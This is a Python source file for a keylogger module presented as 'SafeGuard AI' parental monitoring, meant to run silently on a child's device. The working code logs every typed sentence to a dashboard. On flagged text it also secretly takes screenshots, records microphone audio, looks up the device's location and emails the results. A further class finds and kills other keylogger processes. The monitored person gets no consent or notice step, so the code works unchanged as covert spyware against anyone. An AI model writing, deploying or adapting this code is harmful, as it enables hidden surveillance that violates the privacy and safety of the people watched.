"""
keylogger/keylogger.py
━━━━━━━━━━━━━━━━━━━━━━
SafeGuard AI — Keylogger Module
Captures keystrokes, runs ML analysis, sends alerts, captures screenshot & audio.
Designed to run silently in the background on the child's device.
"""

import os
import sys
import threading
import time
import socket
import platform
import logging
import requests
from datetime import datetime

# Add parent dir to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ml_model.offensive_model import OffensiveContentDetector
from backend.email_service import EmailAlertService
from dotenv import load_dotenv

load_dotenv()

logger = logging.getLogger(__name__)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("safeguard.log"),
        logging.StreamHandler(),
    ],
)

DASHBOARD_API = os.getenv("DASHBOARD_API", "http://localhost:5000/api")
SCREENSHOT_DIR = os.getenv("SCREENSHOT_DIR", "screenshots")
AUDIO_DIR = os.getenv("AUDIO_DIR", "audio")
AUDIO_DURATION = int(os.getenv("AUDIO_DURATION_SECONDS", "30"))
ENABLE_SCREENSHOT = os.getenv("ENABLE_SCREENSHOT", "True").lower() == "true"
ENABLE_AUDIO = os.getenv("ENABLE_AUDIO_RECORD", "True").lower() == "true"

os.makedirs(SCREENSHOT_DIR, exist_ok=True)
os.makedirs(AUDIO_DIR, exist_ok=True)


def get_system_info() -> str:
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return (
            f"Hostname: {hostname} | IP: {local_ip} | "
            f"OS: {platform.system()} {platform.version()} | "
            f"Processor: {platform.processor()}"
        )
    except Exception:
        return "System info unavailable"


def get_location_info() -> str:
    try:
        resp = requests.get("http://ip-api.com/json/", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            city = data.get("city", "")
            country = data.get("countryCode", "")
            if city or country:
                return f"{city}, {country}".strip(", ")
    except Exception:
        pass
    return "Location unavailable"


def take_screenshot() -> str | None:
    """Capture a screenshot and save it. Returns file path or None."""
    if not ENABLE_SCREENSHOT:
        return None
    try:
        from PIL import ImageGrab
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(SCREENSHOT_DIR, f"ss_{timestamp}.png")
        img = ImageGrab.grab()
        img.save(path)
        logger.info(f"[SCREENSHOT] Saved: {path}")
        return path
    except Exception as e:
        logger.error(f"[SCREENSHOT] Error: {e}")
        return None


def record_audio(duration: int = AUDIO_DURATION) -> str | None:
    """Record microphone audio. Returns file path or None."""
    if not ENABLE_AUDIO:
        return None
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write as wav_write
        import numpy as np

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(AUDIO_DIR, f"audio_{timestamp}.wav")
        fs = 44100
        logger.info(f"[AUDIO] Recording {duration}s audio...")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype="float32")
        sd.wait()
        recording_int = (recording * 32767).astype("int16")
        wav_write(path, fs, recording_int)
        logger.info(f"[AUDIO] Saved: {path}")
        return path
    except Exception as e:
        logger.error(f"[AUDIO] Error: {e}")
        return None


def get_active_application() -> str:
    """Try to detect which application is currently focused."""
    try:
        import psutil
        # Cross-platform: just return a best guess
        # On Windows you'd use win32gui; on Linux use xdotool
        for proc in psutil.process_iter(["name", "status"]):
            if proc.info["status"] == psutil.STATUS_RUNNING:
                name = proc.info["name"].lower()
                if any(b in name for b in ["chrome", "firefox", "edge", "brave"]):
                    return "Browser"
                if any(w in name for w in ["whatsapp", "telegram", "discord"]):
                    return name.title()
        return "Desktop"
    except Exception:
        return "Unknown"


def post_to_dashboard(endpoint: str, data: dict) -> bool:
    """Post data to the Flask dashboard API."""
    try:
        resp = requests.post(
            f"{DASHBOARD_API}/{endpoint}", json=data, timeout=5
        )
        return resp.status_code == 200
    except Exception as e:
        logger.warning(f"[API] Could not reach dashboard: {e}")
        return False


class KeyLogger:
    """
    Core keylogger class.
    Captures typed sentences, runs ML analysis, triggers alerts.
    """

    def __init__(self):
        self.current_sentence = ""
        self.detector = OffensiveContentDetector(
            model_name=os.getenv("ML_MODEL_NAME", "cardiffnlp/twitter-roberta-base-offensive"),
            threshold=float(os.getenv("ML_THRESHOLD", "0.50")),
        )
        self.email_service = EmailAlertService()
        self.system_info = get_system_info()
        self._keylog_buffer = []
        self._lock = threading.Lock()

        logger.info("=" * 60)
        logger.info("  SafeGuard AI Keylogger started")
        logger.info(f"  Device: {self.system_info}")
        logger.info("=" * 60)

    def _on_key_press(self, key):
        """pynput key press callback."""
        try:
            from pynput.keyboard import Key
            char = getattr(key, "char", None)

            if char is not None:
                self.current_sentence += char
                with self._lock:
                    self._keylog_buffer.append(char)

            elif key == Key.space:
                self.current_sentence += " "
                with self._lock:
                    self._keylog_buffer.append(" ")

            elif key == Key.enter:
                self._process_sentence(self.current_sentence.strip())
                self.current_sentence = ""

            elif key == Key.backspace:
                self.current_sentence = self.current_sentence[:-1]

        except Exception as e:
            logger.error(f"[KEYLOGGER] Key capture error: {e}")

    def _process_sentence(self, sentence: str):
        """Run ML analysis and trigger alerts if harmful."""
        if not sentence:
            return

        app = get_active_application()
        result = self.detector.analyze(sentence)

        logger.info(
            f"[KEYLOG] '{sentence[:60]}' → "
            f"harmful={result['is_harmful']} | "
            f"cat={result['category']} | "
            f"conf={result['confidence']}%"
        )

        # Post every keylog to dashboard
        post_to_dashboard("keylog", {
            "sentence": sentence,
            "application": app,
            "is_harmful": result["is_harmful"],
            "category": result["category"],
            "confidence": result["confidence"],
        })

        if result["is_harmful"]:
            self._trigger_alert(sentence, result, app)

    def _trigger_alert(self, sentence: str, result: dict, app: str):
        """Capture evidence and send alert to parent."""
        logger.warning(
            f"[ALERT] 🚨 Harmful content: '{sentence[:80]}' "
            f"[{result['category'].upper()}] conf={result['confidence']}%"
        )

        def handle_alert():
            # Capture evidence
            ss_path = take_screenshot()
            audio_path = record_audio()
            location = get_location_info()
                
            # Post alert to dashboard
            post_to_dashboard("alert", {
                "content": sentence,
                "category": result["category"],
                "severity": result["severity"],
                "confidence": result["confidence"],
                "application": app,
                "location": location,
                "screenshot_path": ss_path,
                "audio_path": audio_path,
            })

            # Send email
            self.email_service.send_alert(
                subject=f"{result['category'].replace('_', ' ').title()} keyword detected",
                content=sentence,
                category=result["category"],
                severity=result["severity"],
                confidence=result["confidence"],
                screenshot_path=ss_path,
                audio_path=audio_path,
            )

        # Run completely in background so keylogger isn't blocked
        t = threading.Thread(target=handle_alert, daemon=True)
        t.start()

    def run(self):
        """Start the keylogger listener."""
        try:
            from pynput.keyboard import Listener
            logger.info("[KEYLOGGER] Listener started. Press CTRL+C to stop.")
            with Listener(on_press=self._on_key_press) as listener:
                listener.join()
        except ImportError:
            logger.error("[KEYLOGGER] pynput not installed. Run: pip install pynput")
        except KeyboardInterrupt:
            logger.info("[KEYLOGGER] Stopped by user.")


# ── Anti-Keylogger Scanner ────────────────────────────────────────────────────

class AntiKeyloggerScanner:
    """
    Scans running processes for known keylogger signatures.
    Used to detect if ANOTHER keylogger is running on the child's device.
    """

    SIGNATURES_FILE = os.path.join(
        os.path.dirname(__file__), "..", "keylogger", "signatures.txt"
    )
    WHITELIST_FILE = os.path.join(
        os.path.dirname(__file__), "..", "keylogger", "whitelist.txt"
    )

    def __init__(self):
        self.signatures = self._load_file(self.SIGNATURES_FILE)
        self.whitelist = self._load_file(self.WHITELIST_FILE)

    def _load_file(self, path: str) -> list:
        try:
            with open(path) as f:
                return [l.strip().lower() for l in f if l.strip()]
        except FileNotFoundError:
            return []

    def scan(self) -> list:
        """Return list of suspicious processes found."""
        import psutil
        suspicious = []
        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                cmdline = " ".join(proc.info.get("cmdline") or []).lower()
                name = (proc.info.get("name") or "").lower()
                if name in self.whitelist:
                    continue
                for sig in self.signatures:
                    if sig in cmdline and name not in self.whitelist:
                        suspicious.append({
                            "pid": proc.info["pid"],
                            "name": name,
                            "cmdline": cmdline[:200],
                        })
                        break
            except Exception:
                continue
        return suspicious

    def terminate(self, pid: int) -> bool:
        import psutil
        try:
            psutil.Process(pid).terminate()
            return True
        except Exception:
            return False


if __name__ == "__main__":
    kl = KeyLogger()
    kl.run()
